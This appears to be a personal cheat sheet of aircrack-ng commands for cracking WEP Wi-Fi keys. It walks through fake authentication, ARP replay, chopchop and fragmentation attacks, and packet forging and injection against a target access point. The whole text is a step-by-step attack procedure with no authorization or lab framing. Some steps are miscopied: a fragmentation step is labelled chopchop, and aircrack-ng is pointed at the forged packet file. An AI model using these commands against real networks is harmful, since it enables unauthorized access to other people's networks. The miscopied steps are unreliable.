####################    WEP Cracking - Basic Case     ###################

# strat your WiFi card in monitor mode. Now,
airodump-ng wlan0mon


# now apply network sniffing technique on a perticular network.
airodump-ng --bssid [BSSID] --channel [CHANNEL] --write [file_name] [INTERFACE (wlan0mon)]

# now launch aircrack-ng along with airodump-ng in background.
aircrack-ng [file_name.cap]     # file extension is ".cap"

# Note :  make sure that we are getting more and more IV's i.e. (#Data).




#####################     Associating With Target Network Using Fake Authentication Attack      #####################

airodump-ng --bssid [BSSID] --channel [CHANNEL] [INTERFACE]

aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [INTERFACE]
# after this we are authenticated with the network and associated with it so that we can inject packets to this AP.( this can not ignore our request).




#########################          ARP Request Reply Attack (Method - 1)        #######################

#   launch airodump-ng to the target network.
airodump-ng --bssid [BSSID] --channel [CHANNEL] --write [file_name] [INTERFACE (wlan0mon)]

# execute the fake authencation attack
aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [INTERFACE]

# execute the ARP Request Reply Attack . Make sure that airodump-ng is running in the background.
aireplay-ng --arpreplay  -a [target MAC] -h [your MAC] [INTERFACE]
# inject the ARP packets due to which Target will create new IV's , that we will be capturing.

# Now it's time to launch aicrack-ng.
aircrack-ng [file_name.cap]




##############################      Chopchop Attack (Method - 2)     #####################

# launch aerodump-ng against the target network.
airodump-ng --bssid [BSSID] --channel [CHANNEL] --write [file_name] [INTERFACE (wlan0mon)]

# execute the fake authencation attack
aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [INTERFACE]

# execute the chopchop attack. Capture a packet and determine it's keystream
aireplay-ng --chopchop -b [target MAC] -h [your MAC] [INTERFACE]

# Forge a new packet
packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [output_file_created_in_last_step.xor] -w [forge_packet_name]

# inject this forged packet into traffic in order to cause no. of data to increase
aireplay-ng -2 -r [forge_packet_name] [INTERFACE]

# Now execute the aircrack-ng.
aircrack-ng [forge_packet_name.cap]



############################         Fragmentation Attack (Method - 3)       ######################

# launch aerodump-ng against the target network.
airodump-ng --bssid [BSSID] --channel [CHANNEL] --write [file_name] [INTERFACE (wlan0mon)]

# execute the fake authencation attack
aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [INTERFACE]

# execute the chopchop attack. Capture a packet and determine it's keystream
aireplay-ng --fragment -b [target MAC] -h [your MAC] [INTERFACE]

# Forge a new packet
packetforge-ng -0 -a [target MAC] -h [your MAC] -k 255.255.255.255 -l 255.255.255.255 -y [output_file_created_in_last_step.xor] -w [forge_packet_name]

# inject this forged packet into traffic in order to cause no. of data to increase
aireplay-ng -2 -r [forge_packet_name] [INTERFACE]

# Now execute the aircrack-ng.
aircrack-ng [forge_packet_name.cap]

